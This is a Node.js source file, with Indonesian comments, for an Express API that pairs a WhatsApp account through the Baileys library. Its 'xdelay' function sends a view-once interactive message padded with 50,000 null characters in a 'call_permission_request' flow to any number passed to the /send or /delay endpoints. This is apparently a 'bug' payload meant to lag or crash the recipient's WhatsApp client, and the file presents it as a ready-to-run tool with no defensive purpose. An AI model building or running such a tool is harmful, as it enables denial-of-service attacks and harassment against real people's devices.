// index.js
const express = require("express");
const P = require("pino");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;
const SESSION_DIR = path.join(__dirname, "session");

if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR);

let sock = null;
let connected = false;
let connecting = false;

// ---------------------------
// Fungsi custom: xdelay
// ---------------------------
async function xdelay(targetJid) {
  if (!sock) throw new Error("WhatsApp belum terhubung");

  const params = "\u0000".repeat(50000); // isi dummy, bisa diubah sesuai kebutuhan

  const messageContent = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Hay Mau Tag Boleh war...\n -Judge Holdem",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: params,
            version: 3
          }
        }
      }
    }
  };

  const zxv = await generateWAMessageFromContent(targetJid, messageContent, {
    ephemeralExpiration: 0,
    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
  });

  await sock.relayMessage(targetJid, zxv.message, {
    messageId: zxv.key.id
  });

  console.log("✅ xdelay terkirim ke", targetJid);
  return { target: targetJid, id: zxv.key.id };
}

// ---------------------------
// Connect / Disconnect logic
// ---------------------------
async function connectWA() {
  if (connected) throw new Error("Sudah ada koneksi aktif");
  if (connecting) throw new Error("Sedang mencoba connect");

  connecting = true;
  try {
    const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
    const { version } = await fetchLatestBaileysVersion();
    sock = makeWASocket({
      version,
      auth: state,
      printQRInTerminal: false,
      logger: P({ level: "silent" })
    });

    sock.ev.on("connection.update", (update) => {
      const { connection, pairingCode } = update;

      if (pairingCode) {
        console.log("🔑 Masukkan kode pairing di WhatsApp:", pairingCode);
      }

      if (connection === "open") {
        connected = true;
        connecting = false;
        console.log("✅ WhatsApp terhubung.");
      } else if (connection === "close") {
        connected = false;
        connecting = false;
        console.log("❌ Koneksi terputus.");
      }
    });

    sock.ev.on("creds.update", saveCreds);

    return true;
  } finally {
    connecting = false;
  }
}

async function disconnectWA() {
  if (!sock) throw new Error("Belum terhubung");
  try {
    await sock.logout();
  } catch (e) {
    console.warn("Error logout:", e.message || e);
  }
  sock = null;
  connected = false;
  console.log("🔌 WhatsApp disconnected");
}

// ---------------------------
// API Endpoints
// ---------------------------

// Status
app.get("/status", (req, res) => {
  res.json({ connected, connecting });
});

// Manual connect
app.post("/connect", async (req, res) => {
  try {
    await connectWA();
    res.json({ success: true, message: "Mencoba connect. Lihat terminal untuk pairing code." });
  } catch (e) {
    res.status(400).json({ success: false, error: e.message });
  }
});

// Manual disconnect
app.post("/disconnect", async (req, res) => {
  try {
    await disconnectWA();
    res.json({ success: true, message: "Logout sukses." });
  } catch (e) {
    res.status(400).json({ success: false, error: e.message });
  }
});

// Trigger function via JSON body
app.post("/send", async (req, res) => {
  const { target, func } = req.body;
  if (!target || !func) return res.status(400).json({ error: "Missing target or func" });
  if (!connected) return res.status(400).json({ error: "WhatsApp belum terhubung" });

  const targetJid = target.endsWith("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  try {
    if (func === "xdelay") {
      const r = await xdelay(targetJid);
      res.json({ success: true, data: r });
    } else {
      res.status(400).json({ error: "Function tidak ditemukan" });
    }
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Trigger function via path: /delay/:func=:target
app.get("/delay/:func=:target", async (req, res) => {
  const { func, target } = req.params;
  if (!connected) return res.status(400).json({ error: "WhatsApp belum terhubung" });

  const targetJid = target.endsWith("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  try {
    if (func === "xdelay") {
      const r = await xdelay(targetJid);
      res.json({ success: true, data: r });
    } else {
      res.status(400).json({ error: `Function '${func}' tidak ditemukan` });
    }
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Root
app.get("/", (req, res) => {
  res.json({ message: "WhatsApp API siap. Gunakan /connect untuk pairing." });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 API jalan di http://localhost:${PORT}`);
  console.log("POST /connect untuk mulai pairing (lihat terminal untuk kode pairing).");
});